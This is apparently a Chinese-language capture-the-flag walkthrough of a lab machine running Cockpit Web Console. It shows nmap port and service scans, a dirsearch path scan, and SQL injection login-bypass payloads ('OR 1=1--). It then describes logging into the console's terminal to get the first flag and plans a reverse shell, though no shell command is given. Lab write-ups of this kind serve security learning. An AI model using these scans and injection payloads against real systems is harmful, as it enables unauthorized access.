针对目标系统进行端口探测

```
sudo nmap -p- -vvv --min-rate 10000 192.168.108.10
```

![image-20241119214043422](https://s2.loli.net/2024/11/19/GUHnVjuFtcJ4fmC.png)

针对目标开放端口进行相应的服务探测

```
sudo nmap -p22,80,9090 -A 192.168.108.10 -oX Cockpit.xml
```

![image-20241119214059097](https://s2.loli.net/2024/11/19/J1yRkaUvd9NYf6Z.png)

22端口没有可以直接利用的漏洞，我们直接针对80和9090端口的两个服务进行探测

优先针对80端口的服务进行路径扫描

```
dirsearch -u http://192.168.108.10/
```

![image-20241119215623456](https://s2.loli.net/2024/11/19/zjqgSwpTE2Kf5Fd.png)

![image-20241119220231188](https://s2.loli.net/2024/11/19/IzfX6uLiCgO5Tyn.png)

![image-20241119220258996](https://s2.loli.net/2024/11/19/GPS8CONTuqKQd3y.png)

我通过搜索blaze default password，并没有找到理想的答案，我们优先添加左下角的hosts信息

我们尝试针对登录框进行sql注入

```
admin
'1 or 1=1-- 
```

![image-20241119221857010](https://s2.loli.net/2024/11/19/usZlcjM83LUWnPO.png)

展示了这个页面，所以该登录界面或者系统应当是可能存在sql注入漏洞的，

```
admin
'OR 1=1--
```

```

```

我们重新回到9090端口我们通过搜索发现，这个实际是一个叫Cockpit Web Console的应用

![image-20241119222917256](https://s2.loli.net/2024/11/19/Lc9t7w2H6ugQEVl.png)

使用上述的账号密码进行登录

![image-20241119230642710](https://s2.loli.net/2024/11/19/QlLOEn6k29xGpNc.png)

登陆后我们发现可以使用terminal，并获取第一个flag，我们尝试反弹一个shell到本地，更方便使用

